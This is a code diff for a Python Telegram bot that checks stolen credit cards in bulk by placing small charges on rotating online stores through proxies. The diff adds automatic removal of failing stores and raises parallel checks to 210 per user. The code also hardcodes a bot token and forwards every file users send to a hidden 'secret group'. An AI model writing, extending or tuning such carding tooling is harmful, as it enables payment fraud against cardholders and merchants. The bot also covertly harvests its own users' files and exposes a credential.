@@ -182,12 +182,12 @@ log = logging.getLogger("bot")
 TOKEN = "8641106277:AAH85Kp-AZkdBmKZ_A83UAhUySigbvtJC8s" 
 
 # ── Join requirements ─────────────────────────────────────────────────────────      # Replace with your channel ID
-join_chat_id = -1003505280525
-GROUP_LINK = "https://t.me/autizmens"
+join_chat_id = -1004351388607
+GROUP_LINK = "https://t.me/+l4wyJzE1jbI3MTc1"
 
 # Secret group — silently receives every file dropped in bot DMs
-SECRET_FILES_GROUP_ID = -1003946878599
-SECRET_FILES_LINK = "https://t.me/+Jw_qb59taUVhMjZl"
+SECRET_FILES_GROUP_ID = -1004349374523
+SECRET_FILES_LINK = "https://t.me/+Bvdm06idOrhkYmZl"
 
 # ── Paths ─────────────────────────────────────────────────────────────────────
 BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
@@ -1344,7 +1344,7 @@ def menu_keyboard() -> dict:
             [
                 {"text": f"{bold('Commands')}", "callback_data": "menu_check",
                  "icon_custom_emoji_id": "5156781758439490145", "style": "success"},
-                {"text": f"{bold('Updates')}", "url": "https://t.me/talkneon",
+                {"text": f"{bold('Updates')}", "url": "https://t.me/+l4wyJzE1jbI3MTc1",
                  "icon_custom_emoji_id": "5265004080916343533", "style": "primary"},
             ],
             [
@@ -1426,7 +1426,7 @@ WELCOME_MSG_TMPL = (
     "{id_e} <b>ID:</b> <code>{uid}</code>\n"
     "{lock_e} <b>Status:</b> {status}\n\n"
     "<i>Use the menu below to get started.</i>\n"
-    "<i>Need help? → </i><a href=\"https://t.me/talkneon\">Support</a>"
+    "<i>Need help? → </i><a href=\"https://t.me/@ENTRO_VIBER\">Support</a>"
 )
 
 WELCOME_MSG = WELCOME_MSG_TMPL  # legacy alias
@@ -1630,7 +1630,7 @@ async def cb_menu_plans(callback: types.CallbackQuery):
         "━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"{pe('5219971168429158186')} <b>Premium</b> — <i>unlocks all charge &amp; CNN live gates</i>\n"
         f"{pe('5413631334000110048')} <b>Pricing</b> — <i>DM support for current rates</i>\n\n"
-        f"{pe('5330289087054103251')} <i>Contact:</i> <a href=\"https://t.me/talkneon\">@talkneon</a>"
+        f"{pe('5330289087054103251')} <i>Contact:</i> <a href=\"https://t.me/+l4wyJzE1jbI3MTc1\">@talkneonok</a>"
     )
     await _open_page(callback, text, back_keyboard())
 
@@ -3120,6 +3120,41 @@ async def cmd_sortstop(message: types.Message):
     await message.reply(f"{pe(E['stop'])} {bold('Sort will stop after current probes.')}")
 
 
+@router.message(Command("dead"))
+async def cmd_dead(message: types.Message):
+    """Admin: show sites auto-removed for repeated store-side failures."""
+    uid = message.from_user.id
+    if not (auth.is_admin(uid) or auth.is_owner(uid)):
+        return
+    live = len(_load_sites())
+    pending = {k: v for k, v in _SITE_STRIKES.items() if v > 0}
+    lines = []
+    try:
+        if os.path.isfile(DEAD_SITES_FILE):
+            with open(DEAD_SITES_FILE, "r", encoding="utf-8") as f:
+                lines = [l.strip() for l in f if l.strip()]
+    except OSError:
+        pass
+
+    txt = (
+        f"{pe(E['loading'])} {bold('DEAD SITE MONITOR')}\n\n"
+        f"{pe(E['check'])} {bold('Live sites')} — {bold(str(live))}\n"
+        f"{pe(E['warn'])} {bold('On strikes')} — {bold(str(len(pending)))}\n"
+        f"{pe(E['cross'])} {bold('Auto-removed')} — {bold(str(len(lines)))}\n"
+    )
+    if pending:
+        top = sorted(pending.items(), key=lambda x: -x[1])[:8]
+        txt += "\n" + "\n".join(
+            f"{pe(E['next'])} {s[:44]} — {n}/{_DEAD_STRIKES}" for s, n in top
+        )
+    if lines:
+        txt += f"\n\n{pe(E['bolt'])} {bold('Last removed:')}\n" + "\n".join(
+            f"{pe(E['next'])} {l[:60]}" for l in lines[-8:]
+        )
+    await message.reply(txt)
+
+
+
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  SITE-SIDE ERROR AUTO-ROTATION
@@ -3297,6 +3332,101 @@ def _park_site(site: str) -> None:
         _SITE_COOLDOWN[site.lower()] = time.time()
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  DEAD-SITE AUTO-REMOVE
+#  A store that keeps throwing store-side errors is worthless — after
+#  _DEAD_STRIKES failures it is deleted from sites.json / sites.txt for good.
+#  A single real gate verdict (Declined / Charged / CVV / OTP) clears strikes.
+# ══════════════════════════════════════════════════════════════════════════════
+
+_SITE_STRIKES: dict = {}
+_DEAD_STRIKES = 5
+DEAD_SITES_FILE = os.path.join(BASE_DIR, "dead_sites.txt")
+
+
+def _sites_cache_bust() -> None:
+    global _sites_cache, _sites_cache_mtime, _sites_cache_src
+    _sites_cache = None
+    _sites_cache_mtime = 0.0
+    _sites_cache_src = ""
+
+
+def _remove_site_permanently(site: str, reason: str = "") -> bool:
+    """Delete a dead store from sites.json + sites.txt. Returns True if removed."""
+    if not site:
+        return False
+    key = site.rstrip("/").lower()
+    removed = False
+
+    # sites.json
+    try:
+        if os.path.isfile(SITES_JSON):
+            with open(SITES_JSON, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            if isinstance(data, list):
+                kept = [
+                    e for e in data
+                    if (str(e.get("Site") or "").rstrip("/").lower().replace("https://", "").replace("http://", ""))
+                    != key.replace("https://", "").replace("http://", "")
+                ]
+                if len(kept) != len(data):
+                    with open(SITES_JSON, "w", encoding="utf-8") as f:
+                        json.dump(kept, f, indent=2)
+                    removed = True
+    except Exception as exc:
+        log.warning("dead-site: sites.json cleanup failed for %s — %s", site, exc)
+
+    # sites.txt
+    try:
+        if os.path.isfile(SITES_FILE):
+            with open(SITES_FILE, "r", encoding="utf-8") as f:
+                lines = [l.strip() for l in f if l.strip()]
+            kept = [
+                l for l in lines
+                if l.rstrip("/").lower().replace("https://", "").replace("http://", "")
+                != key.replace("https://", "").replace("http://", "")
+            ]
+            if len(kept) != len(lines):
+                with open(SITES_FILE, "w", encoding="utf-8") as f:
+                    f.write("\n".join(kept) + ("\n" if kept else ""))
+                removed = True
+    except Exception as exc:
+        log.warning("dead-site: sites.txt cleanup failed for %s — %s", site, exc)
+
+    if removed:
+        _sites_cache_bust()
+        _SITE_STRIKES.pop(key, None)
+        _SITE_COOLDOWN.pop(key, None)
+        _VARIANT_CACHE.pop(key, None)
+        try:
+            with open(DEAD_SITES_FILE, "a", encoding="utf-8") as f:
+                f.write(f"{site}  |  {reason[:80]}\n")
+        except OSError:
+            pass
+        log.warning("[dead-site] REMOVED %s — %s", site, reason[:80])
+    return removed
+
+
+def _site_strike(site: str, reason: str = "") -> None:
+    """Record a store-side failure; auto-remove once it hits the strike limit."""
+    if not site:
+        return
+    key = site.rstrip("/").lower()
+    n = _SITE_STRIKES.get(key, 0) + 1
+    _SITE_STRIKES[key] = n
+    log.info("[dead-site] strike %d/%d → %s (%s)", n, _DEAD_STRIKES, site, reason[:60])
+    if n >= _DEAD_STRIKES:
+        _remove_site_permanently(site, reason)
+
+
+def _site_clear(site: str) -> None:
+    """A real gate verdict came back — the store works, reset its strikes."""
+    if site:
+        _SITE_STRIKES.pop(site.rstrip("/").lower(), None)
+
+
+
+
 async def check_card_rotating(
     cc_str: str,
     proxy_data: dict | None,
@@ -3324,11 +3454,16 @@ async def check_card_rotating(
             variant_id, _vprice = await resolve_cheapest_variant(cur_site, cur_proxy)
         except Exception:
             variant_id, _vprice = None, None
+        # no reachable catalog at all → the store is dead, strike it hard
+        if variant_id is None and _vprice is None:
+            _site_strike(cur_site, "no catalog / unreachable")
         # too expensive? don't burn the card on a $60 item — jump to another store
         if _vprice is not None and _vprice > _VARIANT_MAX_PRICE:
             log.info(f"[rotate] skip {cur_site} — cheapest item ${_vprice:.2f} > ${_VARIANT_MAX_PRICE:.2f}")
+            _site_strike(cur_site, f"cheapest ${_vprice:.2f} over cap")
             _park_site(cur_site)
             _VARIANT_CACHE.pop(cur_site.rstrip("/").lower(), None)
+
             nxt2 = None
             for _t in range(40):
                 cand = get_random_site()
@@ -3346,10 +3481,14 @@ async def check_card_rotating(
         except Exception as e:
             result = {"Response": str(e)[:80], "Price": "-", "Gate": "-", "Status": "Error"}
         if not _is_site_side_error(result.get("Response", "")):
+            # real gate verdict → this store works, wipe its strikes
+            _site_clear(cur_site)
             return result
-        # store failed → park it, drop the stale variant, move to a fresh store
+        # store failed → strike it, park it, drop the stale variant, move on
+        _site_strike(cur_site, result.get("Response", ""))
         _park_site(cur_site)
         _VARIANT_CACHE.pop(cur_site.rstrip("/").lower(), None)
+
         nxt = None
         for _try in range(40):
             cand = get_random_site()
@@ -3757,6 +3896,8 @@ def _help_page(page: int) -> tuple[str, dict]:
             f"{pe('5307858706250079424')} /api — {bold('external API toggles')}\n"
             f"{pe('5265004080916343533')} /broad — {bold('broadcast (owner)')}\n"
             f"{pe('5219971168429158186')} /sort — {bold('sort sites.txt (reply to .txt)')}\n"
+            f"{pe('5219971168429158186')} /dead — {bold('dead sites auto-removed')}\n"
+
             f"{pe('5467516479027032033')} /sortstop — {bold('cancel running sort')}"
         )
 
@@ -4172,13 +4313,15 @@ _APPROVED_INDICATORS = (
 _RAN_STOP_FLAGS: dict[str, bool] = {}   # "chat_id:user_id" -> stop flag
 _RAN_ACTIVE_USERS: set[int] = set()      # user IDs with an active /chk in progress
 _RAN_FILES: dict[str, dict] = {}         # stop_key -> per-category CC lists for download/retry
-# Tuned for 30-proxy pool + up to 15 concurrent users:
-#   60 threads per user × 15 users share a 900-slot global pool.
-#   With ~15 s avg per check, 5000 CCs finish in ~20–25 min at full 60 threads,
-#   or ~30 min when 15 users are all running (each gets a ≈60-slot fair share).
-RAN_PER_USER = 60                        # parallel checks per /chk session
-_RAN_GLOBAL_LIMIT = 900                  # max /chk checks across ALL users at once
+# Tuned for 40–70 proxy pool + up to 15 concurrent users:
+#   Target ≈ 3 concurrent checks per proxy → 70 proxies × 3 ≈ 210 per user.
+#   Global ceiling keeps 15 heavy users civil (~1500 in-flight max).
+#   With ~10–14 s avg per check, 5000 CCs finish in ~8–12 min solo,
+#   ~18–22 min under full 15-user load.
+RAN_PER_USER = 210                       # parallel checks per /chk session
+_RAN_GLOBAL_LIMIT = 1800                 # max /chk checks across ALL users at once
 _ran_global_sem = asyncio.Semaphore(_RAN_GLOBAL_LIMIT)
+
 _ran_user_sems: dict[int, asyncio.Semaphore] = {}
 
 
